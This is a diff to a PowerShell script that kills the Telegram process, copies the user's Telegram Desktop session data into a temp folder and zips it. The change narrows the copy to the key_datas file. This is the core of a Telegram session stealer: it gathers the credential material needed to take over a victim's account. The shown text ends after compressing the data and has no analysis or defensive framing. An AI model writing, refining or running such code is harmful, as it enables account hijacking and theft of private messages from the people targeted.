@@ -1,9 +1,9 @@
 taskkill /f /im Telegram.exe
-$t = "$env:APPDATA\Telegram Desktop\tdata"
+$t = "$env:APPDATA\Telegram Desktop\tdata\key_datas"
 if (!(Test-Path $t)) { exit }
 $d = "$env:TMP\t"
 New-Item $d -ItemType Directory -Force | Out-Null
-Get-ChildItem "$t" | Where-Object { $_.Name -notmatch "^(cache|dumps|temp|media_cache)$" } | ForEach-Object { Copy-Item $_.FullName $d -Recurse -Force }
+Copy-Item $t $d -Force
 $z = "$env:TMP\t.zip"
 Compress-Archive "$d\*" $z -Force
 Remove-Item $d -Recurse -Force
